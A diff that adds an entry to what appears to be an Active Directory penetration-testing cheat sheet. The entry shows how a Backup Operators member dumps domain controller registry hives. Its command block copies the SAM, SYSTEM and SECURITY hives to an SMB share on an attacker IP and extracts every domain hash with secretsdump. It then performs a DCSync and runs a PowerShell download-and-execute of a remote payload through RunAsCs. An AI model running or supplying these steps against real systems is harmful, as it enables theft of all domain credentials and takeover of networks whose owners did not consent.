@@ -135,3 +135,29 @@
   nxc smb <target> -u <u> -p <p> -M gpp_password
   nxc smb <target> -u <u> -p <p> -M gpp_autologin
   ```
+
+### Backup Operators NTDS Dump via reg.py (horizon3ai) [added: 2026-04]
+- **Tags:** #BackupOperators #NTDS #DCSync #PrivEsc #Impacket #RegistryDump
+- **Trigger:** BloodHound shows user is member of BACKUP OPERATORS group; no direct DA
+- **Prereq:** Valid plaintext creds for BACKUP OPERATORS member; Impacket installed; SMB share reachable from DC; interactive logon (RunAsCs -l 2 may be needed to bypass network auth restrictions)
+- **Yields:** SAM/SYSTEM/SECURITY hive dump → NTLM hashes for all domain accounts via secretsdump
+- **Opsec:** Med
+- **Context:** BACKUP OPERATORS have SeBackupPrivilege which allows reading any file. reg.py from horizon3ai automates dumping registry hives over SMB. secretsdump then extracts all domain hashes locally.
+- **Payload/Method:**
+  ```bash
+  # Attacker: stand up SMB share
+  sudo impacket-smbserver share adlab/ -smb2support
+  mkdir adlab
+
+  # Dump hives to attacker share
+  python3 reg.py '<user>:<pass>'@<DC_IP> backup -p '\\<ATTACKER_IP>\share'
+  # Source: https://raw.githubusercontent.com/horizon3ai/backup_dc_registry/main/reg.py
+
+  # Extract all hashes locally
+  impacket-secretsdump LOCAL -system ./adlab/SYSTEM -security ./adlab/SECURITY -sam ./adlab/SAM
+
+  # DCSync using machine account hash
+  impacket-secretsdump '<domain>/<DC_HOSTNAME>$'@<DC_FQDN> -hashes aad3b435b51404eeaad3b435b51404ee:<MACHINE_NT_HASH>
+  ```
+  > Note: If running from non-interactive shell (Evil-WinRM), use RunAsCs -l 2 first:
+  > `.\RunAsCs.exe -l 2 <user> <pass> -d <domain> 'powershell iex(iwr -useb <payload>)'`
